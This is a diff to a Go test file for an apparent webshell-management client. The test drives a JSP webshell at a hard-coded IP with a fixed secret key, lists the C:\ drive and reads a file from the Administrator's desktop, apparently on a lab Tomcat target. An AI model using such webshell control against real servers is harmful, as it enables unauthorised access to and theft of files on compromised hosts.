@@ -15,8 +15,13 @@ import (
 func TestNewWebJSPShell(t *testing.T) {
 
 	url := "http://47.120.44.219:8080/go0p-json.jsp"
+	testHeaders := map[string]string{
+		"xxx":  "yyy",
+		"go0p": "go0p",
+	}
 	bx, _ := NewBehinderManager(url,
 		SetSecretKey("rebeyond"),
+		SetHeaders(testHeaders),
 		SetShellScript("jsp"),
 		SetProxy("http://127.0.0.1:9999"),
 	)
@@ -40,13 +45,21 @@ func TestNewWebJSPShell(t *testing.T) {
 		}
 		return decodedData, nil
 	})
-	ping, err := bx.showFile("C:\\Vuln\\apache-tomcat-8.5.84\\webapps\\S2-032\\go0p-json.jsp")
+	dir, err := bx.listFile("C:\\")
 	//ping, err := bx.showFile("C:\\Vuln\\apache-tomcat-8.5.84\\webapps\\S2-032")
 	if err != nil {
 		t.Error(err)
 		return
 	}
-	t.Logf("%s", string(ping))
+	t.Logf("%s", string(dir))
+
+	x, err := bx.showFile("C:\\Users\\Administrator\\Desktop\\1.txt")
+
+	if err != nil {
+		t.Error(err)
+		return
+	}
+	t.Logf("%s", string(x))
 }
 
 func TestNewWebASPXShell(t *testing.T) {
